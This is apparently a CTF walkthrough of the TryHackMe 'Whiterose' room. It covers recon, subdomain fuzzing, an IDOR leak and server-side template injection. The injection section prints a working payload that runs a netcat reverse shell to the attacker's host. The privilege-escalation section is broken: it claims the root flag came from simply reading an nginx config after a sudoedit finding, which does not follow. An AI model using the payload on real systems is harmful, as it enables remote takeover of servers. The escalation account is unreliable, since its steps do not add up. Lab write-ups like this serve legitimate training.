# Write-up — Whiterose🤍 ([TryHackMe Room](https://tryhackme.com/room/whiterose))

# Introduction
In this room, [Whiterose](https://tryhackme.com/room/whiterose) from TryHackMe, we’re tasked with breaking into a simulated bank environment by exploring subdomains, bypassing authentication, and exploiting a vulnerable admin panel. The room combines reconnaissance, web exploitation, and privilege escalation techniques. This write-up will walk through each step taken to gain full system access and retrieve both user and root flags.
## Reconnaissance
We begin by adding the target domain to our /etc/hosts file:
```python
sudo nano /etc/hosts
10.10.10.10 cyprusbank.thm
```
Next, perform a full port scan using Nmap:
```python
nmap -sC -sV -p- -T4 cyprusbank.thm
```
Open ports:
```python
22 - SSH (OpenSSH 7.6p1)
80 - HTTP (nginx 1.14.0)
```
The web server on port 80 didn’t reveal much via directory enumeration:
```python
gobuster dir -u http://cyprusbank.thm -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```
## Subdomain Enumeration
We used ffuf to look for subdomains:
```python
ffuf -u http://cyprusbank.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cyprusbank.thm" -fw 1
```
Found:
```python
www.cyprusbank.thm
admin.cyprusbank.thm
```
We then added the new subdomain to /etc/hosts:
```python
10.10.10.10 admin.cyprusbank.thm
```
## Login Bypass and Enumeration
Using credentials provided in the room (Olivia Cortez:olivi8), we accessed the admin panel and found an interesting URL parameter in the Messages section:
```python
http://admin.cyprusbank.thm/messages/?c=5
```
Changing the parameter to c=0 triggered an IDOR vulnerability, revealing a hidden message where Gayle Bev shares her password with the dev team.

We then logged in as Gayle Bev and gained access to Settings, where a form was vulnerable to SSTI (Server-Side Template Injection).

## Getting a Shell (SSTI Exploitation)
Using Burp Suite and the Repeater, we injected the following payload:
```python
name=test&password=1234&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.10.10.10 4444 -e bash');s
```
Once triggered, this gave us a reverse shell as the web user.

User Flag:
```python
cat user.txt
THM{***********}
```
## Privilege Escalation
```python
sudo -l
(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
We simply read the file using:

```python
cat /etc/nginx/sites-available/admin.cyprusbank.thm
```
Root Flag:
```python
THM{********}
```
# Conclusion

This challenge was a great mix of real-world web exploitation techniques such as IDOR and SSTI, coupled with basic privilege escalation through misconfigured sudoedit. It reinforces the importance of secure web development practices and careful privilege delegation in Linux environments. Overall, a solid room for sharpening reconnaissance and post-exploitation skills.
